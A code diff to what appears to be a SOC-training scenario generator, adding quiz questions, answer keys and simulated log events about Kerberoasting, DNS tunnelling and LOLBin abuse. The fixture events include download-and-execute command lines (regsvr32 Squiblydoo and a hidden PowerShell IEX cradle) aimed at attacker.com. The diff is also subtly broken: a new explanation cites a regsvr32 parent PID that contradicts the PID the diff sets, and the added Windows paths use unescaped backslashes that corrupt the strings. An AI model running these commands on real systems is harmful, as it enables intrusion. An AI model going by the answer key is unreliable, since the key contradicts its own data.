@@ -4929,7 +4929,68 @@ export function buildKerberoastingScenario(scenarioId = "kerberoasting-2026"): S
       { ts: T(15 * MIN),      phase: "Credential Use",     action: "svc-mssql password cracked — interactive login to srv-db01" },
       { ts: T(18 * MIN),      phase: "Execution",          action: "xp_cmdshell spawns encoded PowerShell — attacker achieves code execution on DB server" },
     ],
-    questions: [],
+    questions: [
+      {
+        id: "kerb_q1_rc4",
+        prompt: "Event evt_kerb_03_tgs_sql is a 4769 service-ticket request whose TicketEncryptionType is 0x17. Why does that single value turn a routine Kerberos event into a Kerberoasting indicator?",
+        kind: "single",
+        options: [
+          { value: "rc4_offline_crack", label: "An RC4 ticket is encrypted with the service account's NTLM hash, so it cracks offline" },
+          { value: "dc_fallback", label: "0x17 means the DC rejected the stronger cipher and issued a downgraded ticket instead" },
+          { value: "preauth_disabled", label: "0x17 marks the target account as having Kerberos pre-authentication switched off" },
+          { value: "tgt_only_value", label: "0x17 can only ever appear on a TGT request, never on a service-ticket request" },
+        ],
+        answer: "rc4_offline_crack",
+        xp: 50,
+        explanation:
+          "0x17 is RC4-HMAC. The TGS is sealed with a key derived directly from the service account's NTLM hash, so anyone holding the ticket can brute-force the password offline with no further traffic to the DC — that is the whole point of Kerberoasting (T1558.003). 'dc_fallback' is wrong: the client, not the DC, proposes the encryption types, and RC4 here was requested, not forced. 'preauth_disabled' describes AS-REP roasting (T1558.004), which shows up as PreAuthType 0 on a 4768 TGT request, not as an encryption type on a 4769. 'tgt_only_value' inverts the facts — the record is event ID 4769, a TGS, and TicketEncryptionType appears on both 4768 and 4769.",
+      },
+      {
+        id: "kerb_q2_volume",
+        prompt: "Select the TWO observations that, taken together, separate this activity from normal Kerberos ticket traffic. You will need evt_kerb_02_ldap_spn and evt_kerb_06_ticket_spike.",
+        kind: "multi",
+        options: [
+          { value: "spn_enum_first", label: "An LDAP servicePrincipalName wildcard query returned 8 accounts two minutes earlier" },
+          { value: "twelve_in_90s", label: "Twelve service tickets for twelve distinct SPNs were issued inside a 90-second window" },
+          { value: "logged_on_dc", label: "Every one of the ticket requests was recorded on DC01 rather than on the workstation" },
+          { value: "ntlm_package", label: "The ticket requests name NTLM as the authentication package used against the domain" },
+        ],
+        answer: ["spn_enum_first", "twelve_in_90s"],
+        xp: 75,
+        explanation:
+          "Kerberoasting has a shape: first find every account that has an SPN, then ask for a ticket for each one. The 4662 LDAP query supplies the target list and the 12 tickets in 90 seconds consume it — neither is odd alone, but together they are the technique. 'logged_on_dc' is a property of the log source, not the behaviour: 4769 is *always* written by the KDC on a domain controller, including for m.cohen's benign baseline ticket. 'ntlm_package' is simply false here — 4769 is a Kerberos event by definition and no NTLM package is recorded on it; the NTLM authentication in this scenario appears later, on the 4624s.",
+      },
+      {
+        id: "kerb_q3_chain",
+        prompt: "evt_kerb_07_svcacct_login shows svc-mssql logging on to srv-db01 with LogonType 2, sourced from WS-DEV-4412 and using the NTLM package. Read alongside evt_kerb_03_tgs_sql. What does the pair actually establish?",
+        kind: "single",
+        options: [
+          { value: "cracked_and_reused", label: "The svc-mssql ticket was cracked offline and its recovered password used to log on" },
+          { value: "ticket_replayed", label: "The captured TGS ticket was replayed straight to srv-db01 to open the interactive session" },
+          { value: "service_restart", label: "The SQL Server service restarted on srv-db01 and re-authenticated its own account" },
+          { value: "delegation_relay", label: "Unconstrained delegation on srv-db01 forwarded m.cohen's ticket on to the database host" },
+        ],
+        answer: "cracked_and_reused",
+        xp: 100,
+        explanation:
+          "The link is the eleven-minute gap plus the authentication package. A TGS is Kerberos; this logon is NTLM, which means a password or its hash was typed in, not a ticket presented — so the ticket must have been cracked in between. 'ticket_replayed' fails on that same field: replaying a TGS produces a Kerberos logon, and a service ticket grants access to one service, not an interactive session. 'service_restart' fails on LogonType and origin — a service starting itself is LogonType 5 and originates on srv-db01, whereas this record carries the developer workstation's IP. 'delegation_relay' would impersonate m.cohen, the delegating user, and would still be Kerberos; the TargetUserName here is svc-mssql.",
+      },
+      {
+        id: "kerb_q4_dbexec",
+        prompt: "Select the TWO facts that make the srv-db01 activity a confirmed compromise rather than ordinary database administration.",
+        kind: "multi",
+        options: [
+          { value: "svc_interactive", label: "A service account opened an interactive session from a developer's workstation" },
+          { value: "xp_cmdshell_enc", label: "sqlservr.exe used xp_cmdshell to launch a hidden Base64-encoded PowerShell command" },
+          { value: "master_database", label: "The Guardium record shows the statement was executed against the master database" },
+          { value: "osql_client", label: "The client application on the Guardium record is osql.exe rather than a web app" },
+        ],
+        answer: ["svc_interactive", "xp_cmdshell_enc"],
+        xp: 75,
+        explanation:
+          "Service accounts are meant to be used *by services* — non-interactive logon types from the servers they run on. A LogonType 2 for svc-mssql sourced from a workstation has no benign explanation, and xp_cmdshell spawning hidden encoded PowerShell is command execution on the DB host (T1059.001), not database work. 'master_database' is a red herring: xp_cmdshell is an extended stored procedure that lives in master, so every legitimate call to it is also against master. 'osql_client' is likewise neutral — osql.exe is a Microsoft-supplied SQL client that DBAs use daily; the tool does not make the statement malicious, the statement does.",
+      },
+    ],
   };
 }
 
@@ -4996,8 +5057,8 @@ export function buildDNSTunnelingScenario(scenarioId = "dns-tunneling-2026"): Sc
       source: "sysmon", vendor: "Microsoft Sysmon", event_type: "dns_query",
       hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
       severity: "high", mitre_technique: "T1071.004", mitre_tactic: "TA0011",
-      description: `WS-ENG-3301 queried a 54-character base32-encoded subdomain of ${c2Domain} — the first tunnel query from update.exe.`,
-      dns: { query: `MJQXGZJTGIQGC4DBONSGK4TFONZQ.${c2Domain}`, query_type: "A", response: "NXDOMAIN", rcode: "NOERROR" },
+      description: `WS-ENG-3301 queried a 53-character base32-encoded subdomain of ${c2Domain} — the first tunnel query from update.exe.`,
+      dns: { query: `KNCVGU2JJ5HD2MBRHNEE6U2UHVLVGLKFJZDS2MZTGAYTWVKTIVJD2.data.${c2Domain}`, query_type: "A", response: "192.168.100.5", rcode: "NOERROR" },
       raw: {
         "event.code": "22",
         "winlog.provider_name": "Microsoft-Windows-Sysmon",
@@ -5007,10 +5068,10 @@ export function buildDNSTunnelingScenario(scenarioId = "dns-tunneling-2026"): Sc
         "winlog.event_data.ProcessGuid": "{a1b2c3d4-d5e6-a1b2-0001-c3d4e5f60001}",
         "winlog.event_data.ProcessId": "4488",
         "winlog.event_data.Image": "C:\\Windows\\Temp\\update.exe",
-        "winlog.event_data.QueryName": `MJQXGZJTGIQGC4DBONSGK4TFONZQ.data.${c2Domain}`,
+        "winlog.event_data.QueryName": `KNCVGU2JJ5HD2MBRHNEE6U2UHVLVGLKFJZDS2MZTGAYTWVKTIVJD2.data.${c2Domain}`,
         "winlog.event_data.QueryStatus": "0",
         "winlog.event_data.QueryResults": `type: 1 192.168.100.5`,
-        "dns.question.subdomain_length": "54",
+        "dns.question.subdomain_length": "53",
         "source.ip": victimIp,
         "host.name": victimHost,
       },
@@ -5088,7 +5149,7 @@ export function buildDNSTunnelingScenario(scenarioId = "dns-tunneling-2026"): Sc
         "winlog.event_data.QueryName": `YWRtaW5AY3J5b3RlY2guY29t.data.${c2Domain}`,
         "winlog.event_data.QueryStatus": "0",
         "winlog.event_data.QueryResults": "",
-        "dns.question.subdomain_length": "48",
+        "dns.question.subdomain_length": "24",
         "source.ip": victimIp,
         "host.name": victimHost,
       },
@@ -5100,7 +5161,7 @@ export function buildDNSTunnelingScenario(scenarioId = "dns-tunneling-2026"): Sc
       source: "siem", vendor: "Microsoft Sentinel", event_type: "ids_signature",
       hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
       severity: "critical", mitre_technique: "T1041", mitre_tactic: "TA0010",
-      description: `Microsoft Sentinel correlated 247 sequential DNS queries (base32chunk_0001 through base32chunk_0247) from WS-ENG-3301 to data.${c2Domain} over 4 minutes — an estimated 185KB exfiltrated.`,
+      description: `Microsoft Sentinel correlated 247 sequential DNS queries (base32chunk_0001 through base32chunk_0247) from WS-ENG-3301 to data.${c2Domain} over 4 minutes — an estimated 29 KB exfiltrated.`,
       raw: {
         "siem.rule_name": "DNSTunneling_FileChunks",
         "siem.rule_id": "DNS-EXFIL-002",
@@ -5125,7 +5186,7 @@ export function buildDNSTunnelingScenario(scenarioId = "dns-tunneling-2026"): Sc
       source: "dns", vendor: "Windows DNS Server",
       event_type: "dns_query", severity: "informational",
       hostname: victimHost, src_ip: victimIp,
-      description: "WS-ENG-3301 sent about 21 DNS queries per minute to developer tool domains (GitHub, npm, VS Code) — its normal baseline.",
+      description: "WS-ENG-3301 sent about 23 DNS queries per minute to developer tool domains (GitHub, npm, VS Code) — its normal baseline.",
       raw: {
         "event.action": "dns_baseline_aggregate",
         "host.name": victimHost,
@@ -5203,7 +5264,7 @@ export function buildDNSTunnelingScenario(scenarioId = "dns-tunneling-2026"): Sc
     title: "DNS Tunneling — C2 Channel & Data Exfiltration",
     threat_actor: "APT-TUNNELRAT (Nation-State Affiliate)",
     attack_kind: "c2_dns_tunneling",
-    narrative: `An attacker who had established initial access delivered dnscat2 via an encoded PowerShell command. The tool opened a covert C2 channel using DNS queries — encoding all communication as base32 subdomain names to the attacker-controlled domain c2-nexus-update.xyz. Commands were received via DNS TXT record responses. After recon commands, the attacker began exfiltrating sensitive data by encoding it into sequential DNS subdomain names, chunking a 185 KB file over 247 queries in 4 minutes.`,
+    narrative: `An attacker who had established initial access delivered dnscat2 via an encoded PowerShell command. The tool opened a covert C2 channel using DNS queries — encoding all communication as base32 subdomain names to the attacker-controlled domain c2-nexus-update.xyz. Commands were received via DNS TXT record responses. After recon commands, the attacker began exfiltrating sensitive data by encoding it into sequential DNS subdomain names, chunking a 29 KB file over 247 queries in 4 minutes — a DNS label is capped at 63 bytes, so each query carries only about 120 bytes of decoded data.`,
     learning_objectives: [
       "Recognize DNS tunneling indicators: high-entropy subdomains, long subdomain names, TXT record C2",
       "Understand why volume (847 queries/min vs. baseline 23) is a key detection signal",
@@ -5220,9 +5281,70 @@ export function buildDNSTunnelingScenario(scenarioId = "dns-tunneling-2026"): Sc
       { ts: T(6 * MIN),  phase: "C2 Active",        action: "847 DNS queries in 60 seconds — tunnel established and active" },
       { ts: T(10 * MIN), phase: "Command & Control", action: "C2 commands delivered via DNS TXT records (encoded: whoami /all, net user)" },
       { ts: T(14 * MIN), phase: "Exfiltration",     action: "Credential data encoded in DNS subdomain names — slow exfil begins" },
-      { ts: T(18 * MIN), phase: "Exfiltration",     action: "247 sequential chunk queries — 185 KB file exfiltrated over DNS" },
+      { ts: T(18 * MIN), phase: "Exfiltration",     action: "247 sequential chunk queries — 29 KB file exfiltrated over DNS" },
     ],
-    questions: [],
+    questions: [
+      {
+        id: "dns_q1_indicators",
+        prompt: "The Sysmon Event ID 22 records from WS-ENG-3301 are the primary evidence. Which combination of fields inside those records is the tunnelling indicator?",
+        kind: "single",
+        options: [
+          { value: "long_label_plus_txt", label: "53-character encoded labels and TXT lookups, all from one image in C:\\Windows\\Temp" },
+          { value: "nxdomain_responses", label: "NXDOMAIN was returned for every name the workstation asked the resolver to look up" },
+          { value: "udp_port_53", label: "The lookups travelled over UDP port 53 to the internal corporate resolver on 10.10.1.1" },
+          { value: "aaaa_alongside_a", label: "AAAA record lookups were issued alongside the ordinary A record lookups by the host" },
+        ],
+        answer: "long_label_plus_txt",
+        xp: 50,
+        explanation:
+          "Sysmon 22 gives you QueryName, QueryResults and — critically — Image. A 53-character random-looking label, TXT lookups, and an image path of C:\\Windows\\Temp\\update.exe are three independent oddities in one record. 'nxdomain_responses' is not what the logs show: QueryStatus is 0 and answers came back, and in any case a burst of NXDOMAIN is routine (search-suffix expansion, typos). 'udp_port_53' describes every DNS query on the network including the benign baseline, so it discriminates nothing. 'aaaa_alongside_a' is normal dual-stack behaviour — the baseline event itself lists A and AAAA as this host's query types.",
+      },
+      {
+        id: "dns_q2_volume",
+        prompt: "Sentinel counted 847 queries in 60 seconds against this host's 23-per-minute baseline. Why is that ratio a more durable detection than blocking the domain c2-nexus-update.xyz?",
+        kind: "single",
+        options: [
+          { value: "volume_is_intrinsic", label: "Domains are cheap to rotate, but any DNS tunnel must send many queries to move data" },
+          { value: "ttl_forces_repeats", label: "A very short record TTL forces the resolver to repeat each lookup many times over" },
+          { value: "entropy_is_useless", label: "Subdomain entropy is the same for CDN hostnames, so only raw counts can be trusted" },
+          { value: "only_rcode_logged", label: "A resolver can only measure the NXDOMAIN share of traffic, not the names requested" },
+        ],
+        answer: "volume_is_intrinsic",
+        xp: 75,
+        explanation:
+          "Volume is a property of the technique, not of the infrastructure: a DNS label carries only tens of bytes, so moving anything meaningful forces thousands of queries. The attacker can register a new domain tomorrow, but cannot make the tunnel quiet. 'ttl_forces_repeats' confuses caching of *answers* with generation of *queries* — the client emits a new unique name per chunk, so TTL is irrelevant. 'entropy_is_useless' overstates a real caveat: CDN hostnames are indeed high-entropy, but this host's baseline entropy is 2.1 against encoded labels, so entropy still discriminates — it is just noisier than volume. 'only_rcode_logged' is false; the resolver logs the full QueryName, which is exactly where the encoded payload sits.",
+      },
+      {
+        id: "dns_q3_encoding",
+        prompt: "In evt_dns_05_exfil_start the label YWRtaW5AY3J5b3RlY2guY29t decodes to admin@cryotech.com. Why must the attacker chunk a file across hundreds of such queries instead of sending it in one?",
+        kind: "single",
+        options: [
+          { value: "label_63_bytes", label: "A single DNS label is capped at 63 bytes, so one query carries well under 64 bytes" },
+          { value: "base64_padding", label: "Base64 padding is illegal in DNS names, which caps any encoded label at 32 bytes" },
+          { value: "udp_512_cap", label: "A DNS query may not exceed 512 bytes total, which limits each label to 128 bytes" },
+          { value: "txt_carries_only", label: "Only TXT records are permitted to carry encoded payloads, and TXT is response-only" },
+        ],
+        answer: "label_63_bytes",
+        xp: 75,
+        explanation:
+          "The wire format decides it: a label is at most 63 bytes and the whole name at most 255, and base32 or base64 expands data before it is even placed there — so roughly 120 bytes of real data per query, hence 247 queries for a 29 KB file. 'base64_padding' starts from a true fact (the '=' character is not a legal hostname character, which is why tunnels strip it or prefer base32) but invents a 32-byte cap that does not exist. 'udp_512_cap' cites a real limit on the whole DNS message, not on a label, and EDNS0 raises it anyway — it is not the binding constraint here. 'txt_carries_only' has the direction backwards: outbound data rides in the query *name*, and TXT is used for the inbound command channel, as evt_dns_04_txt_c2 shows.",
+      },
+      {
+        id: "dns_q4_attribution",
+        prompt: "Select the TWO facts, each drawn from a different event, that tie the DNS tunnel specifically to the PowerShell download rather than to a browser or a misconfigured client.",
+        kind: "multi",
+        options: [
+          { value: "image_path_matches", label: "Sysmon's Image field and the EDR record both name C:\\Windows\\Temp\\update.exe" },
+          { value: "hash_matches", label: "The SHA256 of the downloaded file equals InitiatingProcessSHA256 on the query events" },
+          { value: "corporate_resolver", label: "The queries were sent to the corporate resolver rather than to an external DNS server" },
+          { value: "sequential_chunks", label: "The exfiltration labels are numbered in sequence from chunk 0001 through chunk 0247" },
+        ],
+        answer: ["image_path_matches", "hash_matches"],
+        xp: 100,
+        explanation:
+          "Attribution needs a process identity carried across sources. evt_dns_01_download records the file written to C:\\Windows\\Temp\\update.exe and its SHA256; evt_dns_process_queries records the same path and the same hash as InitiatingProcess on the query traffic, and Sysmon's Image agrees — that is the link. 'corporate_resolver' is exactly what a browser does too: nearly all endpoints send DNS to the internal resolver, so it says nothing about which process. 'sequential_chunks' does prove the traffic is machine-generated exfiltration, but it comes from a SIEM correlation record that carries no process identity at all, so it cannot bind the tunnel to update.exe.",
+      },
+    ],
   };
 }
 
@@ -5268,6 +5390,38 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
       },
     },
     // T+0: certutil.exe downloads payload (T1105)
+    {
+      id: "evt_lol_00b_macro_cmd", ts: T(-30_000),
+      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
+      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
+      severity: "high", mitre_technique: "T1204.002", mitre_tactic: "TA0002",
+      description: "WINWORD.EXE spawned a command shell on the HR workstation thirty seconds before the first LOLBin ran.",
+      process: {
+        name: "cmd.exe", pid: 4420, path: "C:\Windows\System32\cmd.exe",
+        parent_name: "WINWORD.EXE", parent_pid: 3308,
+        cmdline: "cmd.exe /c",
+        user: "s.patel", integrity: "medium",
+        hash: { sha256: makeSha256("cmd_exe_system_binary") },
+      },
+      raw: {
+        "event.provider": "Microsoft Defender ATP",
+        "event.dataset": "DeviceProcessEvents",
+        "event.action": "ProcessCreated",
+        "DeviceName": victimHost,
+        "ActionType": "ProcessCreated",
+        "FileName": "cmd.exe",
+        "FolderPath": "C:\Windows\System32\cmd.exe",
+        "ProcessId": "4420",
+        "ProcessCommandLine": "cmd.exe /c",
+        "InitiatingProcessFileName": "WINWORD.EXE",
+        "InitiatingProcessId": "3308",
+        "AccountName": "s.patel",
+        "AccountDomain": "NEXACORP",
+        "ProcessIntegrityLevel": "Medium",
+        "threat.technique.id": "T1204.002",
+        "threat.technique.name": "User Execution: Malicious File",
+      },
+    },
     {
       id: "evt_lol_01_certutil", ts: T(0),
       source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
@@ -5319,7 +5473,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
       description: "regsvr32.exe ran with /i:http://attacker.com/payload.sct — the Squiblydoo technique that executes a remote COM scriptlet and bypasses AppLocker.",
       process: {
         name: "regsvr32.exe", pid: 5512, path: "C:\\Windows\\System32\\regsvr32.exe",
-        parent_name: "cmd.exe", parent_pid: 5500,
+        parent_name: "cmd.exe", parent_pid: 4420,
         cmdline: "regsvr32 /s /u /i:http://attacker.com/payload.sct scrobj.dll",
         user: "s.patel", integrity: "medium",
         hash: { sha256: makeSha256("regsvr32_system_binary") },
@@ -5394,6 +5548,40 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
     },
 
     // T+10min: wmic.exe enumerates processes (T1057)
+    {
+      id: "evt_lol_03b_powershell", ts: T(7 * MIN + 20_000),
+      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
+      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
+      severity: "high", mitre_technique: "T1059.001", mitre_tactic: "TA0002",
+      description: "A hidden PowerShell process started under mshta.exe and downloaded stage2.ps1 into memory. Every LOLBin that follows names this process as its initiator.",
+      process: {
+        name: "powershell.exe", pid: 6200, path: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+        parent_name: "mshta.exe", parent_pid: 6100,
+        cmdline: "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/stage2.ps1')",
+        user: "s.patel", integrity: "medium",
+        hash: { sha256: makeSha256("powershell_exe_system_binary") },
+      },
+      network: { url: "http://attacker.com/stage2.ps1", domain: "attacker.com", bytes_in: 12288 },
+      raw: {
+        "event.provider": "Microsoft Defender ATP",
+        "event.dataset": "DeviceProcessEvents",
+        "event.action": "ProcessCreated",
+        "DeviceName": victimHost,
+        "ActionType": "ProcessCreated",
+        "FileName": "powershell.exe",
+        "FolderPath": "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+        "ProcessId": "6200",
+        "ProcessCommandLine": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/stage2.ps1')",
+        "InitiatingProcessFileName": "mshta.exe",
+        "InitiatingProcessId": "6100",
+        "AccountName": "s.patel",
+        "AccountDomain": "NEXACORP",
+        "ProcessIntegrityLevel": "Medium",
+        "RemoteUrl": "attacker.com",
+        "threat.technique.id": "T1059.001",
+        "threat.technique.name": "Command and Scripting Interpreter: PowerShell",
+      },
+    },
     {
       id: "evt_lol_04_wmic", ts: T(10 * MIN),
       source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
@@ -5676,7 +5864,68 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
       { ts: T(16 * MIN), phase: "Defense Evasion",            action: "rundll32.exe loads unsigned attacker DLL from C:\\Users\\Public (T1218.011)" },
       { ts: T(20 * MIN), phase: "Persistence",                action: "schtasks.exe creates SYSTEM-level task 'NexaCorpHealthCheck' — every 5 minutes (T1053.005)" },
     ],
-    questions: [],
+    questions: [
+      {
+        id: "lol_q1_signed_binary",
+        prompt: "Every executable in this chain ships with Windows and carries a valid Microsoft signature. Given that, what makes evt_lol_01_certutil malicious?",
+        kind: "single",
+        options: [
+          { value: "flags_and_destination", label: "certutil ran -urlcache -split -f to pull an EXE from an external host over HTTP" },
+          { value: "certutil_unsigned", label: "The certutil.exe image on this workstation was unsigned and failed its signature check" },
+          { value: "hash_matches_payload", label: "certutil.exe's own SHA256 is identical to the SHA256 of the file it just downloaded" },
+          { value: "wrong_folder", label: "certutil.exe was launched out of C:\\Users\\Public instead of its System32 location" },
+        ],
+        answer: "flags_and_destination",
+        xp: 50,
+        explanation:
+          "A LOLBin is judged on behaviour, never on the file. certutil is a certificate utility; -urlcache -split -f turns it into a downloader, and the destination is an uncategorised .ru host — the command line and the network peer are the evidence. 'certutil_unsigned' contradicts the record and misses the lesson: the binary is the genuine signed OS component, which is precisely why it evaded download controls. 'hash_matches_payload' is impossible — one SHA256 identifies one file, and the event carries two distinct hashes, one for the certutil image and one for update.exe. 'wrong_folder' is contradicted by FolderPath, which reads C:\\Windows\\System32; a LOLBin runs from its normal home.",
+      },
+      {
+        id: "lol_q2_squiblydoo",
+        prompt: "evt_lol_02_regsvr32 runs: regsvr32 /s /u /i:http://attacker.com/payload.sct scrobj.dll. Which statement explains why this defeats an AppLocker policy?",
+        kind: "single",
+        options: [
+          { value: "signed_host_interprets", label: "An allow-listed signed binary interprets the remote scriptlet, so no new EXE is started" },
+          { value: "u_flag_unregisters", label: "The /u flag unregisters the DLL, which also strips it out of the AppLocker rule set" },
+          { value: "sct_not_covered", label: "AppLocker never evaluates .sct files at all because it classifies them as image data" },
+          { value: "http_is_exempt", label: "AppLocker only evaluates files on local disk, so anything fetched over HTTP is exempt" },
+        ],
+        answer: "signed_host_interprets",
+        xp: 75,
+        explanation:
+          "This is Squiblydoo (T1218.010). AppLocker decides whether *a process image* may run; regsvr32.exe is a Microsoft binary that virtually every policy permits, and the attacker's code never becomes a process image — scrobj.dll fetches the scriptlet and executes it inside regsvr32. 'u_flag_unregisters' misreads the switch: /u with /i still invokes the scriptlet's unregister entry point, and AppLocker policy is machine configuration that regsvr32 cannot edit. 'sct_not_covered' is close to a real gap but wrong on mechanism — AppLocker does have script rules; they are bypassed because the scriptlet is never written to disk as a file for those rules to evaluate. 'http_is_exempt' invents an exemption; the location of the payload is irrelevant when the evaluated image is an approved one.",
+      },
+      {
+        id: "lol_q3_parent_child",
+        prompt: "Follow InitiatingProcessFileName and the parent PIDs across evt_lol_01 through evt_lol_07. Which reconstruction of the execution chain is supported by the records?",
+        kind: "single",
+        options: [
+          { value: "regsvr_to_mshta_to_ps", label: "regsvr32 (5512) spawned mshta, whose PowerShell (6200) then parented wmic and bitsadmin" },
+          { value: "cmd_parents_everything", label: "cmd.exe (4420) is the recorded direct parent of every process in the chain after certutil" },
+          { value: "certutil_spawned_regsvr", label: "certutil (4440) spawned regsvr32 (5512), which is why the two share the same workstation" },
+          { value: "schtasks_started_chain", label: "schtasks (7900) launched the earlier stages and then re-registered itself to run as SYSTEM" },
+        ],
+        answer: "regsvr_to_mshta_to_ps",
+        xp: 100,
+        explanation:
+          "mshta's record names regsvr32.exe (PID 5512) as its initiating process, and its command line launches hidden PowerShell; wmic, bitsadmin, rundll32 and schtasks all then record powershell.exe PID 6200 as initiator. That is the chain. 'cmd_parents_everything' holds only for the first two steps — and even there they are two different cmd PIDs (4420 and 5500); from wmic onward the initiator is PowerShell, not cmd. 'certutil_spawned_regsvr' asserts a link the data denies: regsvr32's parent PID is 5500, not certutil's 4440, and sharing a host is not a parent-child relationship. 'schtasks_started_chain' is chronologically impossible — schtasks runs at T+20, twenty minutes after certutil, and a process cannot parent events that happened before it existed.",
+      },
+      {
+        id: "lol_q4_persistence",
+        prompt: "Select the TWO events that give the attacker execution surviving a reboot of WS-HR-1133, and be able to say why the others do not.",
+        kind: "multi",
+        options: [
+          { value: "bits_job", label: "The BITS job NexaCorpUpdate resumes its transfer automatically after the machine restarts" },
+          { value: "schtask_system", label: "The task NexaCorpHealthCheck re-runs the dropped binary as SYSTEM every five minutes" },
+          { value: "rundll32_dllmain", label: "rundll32 loading evil.dll from C:\\Users\\Public keeps that DLL resident on the host" },
+          { value: "wmic_enumeration", label: "wmic process list brief registers a permanent WMI event consumer on the workstation" },
+        ],
+        answer: ["bits_job", "schtask_system"],
+        xp: 75,
+        explanation:
+          "BITS jobs are queued in a service that the OS restarts and resumes after reboot (T1197), and a scheduled task is re-registered from disk at boot — here running as SYSTEM every five minutes (T1053.005). Together they give both delivery and execution that outlive a restart. 'rundll32_dllmain' is defence evasion, not persistence: the DLL is loaded into a process, and when that process or the machine dies the execution dies with it — the file remaining on disk is storage, not a trigger. 'wmic_enumeration' confuses two very different wmic uses: process list brief is a read-only discovery query, whereas a permanent WMI subscription requires creating filter and consumer objects under root\\subscription, which appears nowhere in these logs.",
+      },
+    ],
   };
 }
 
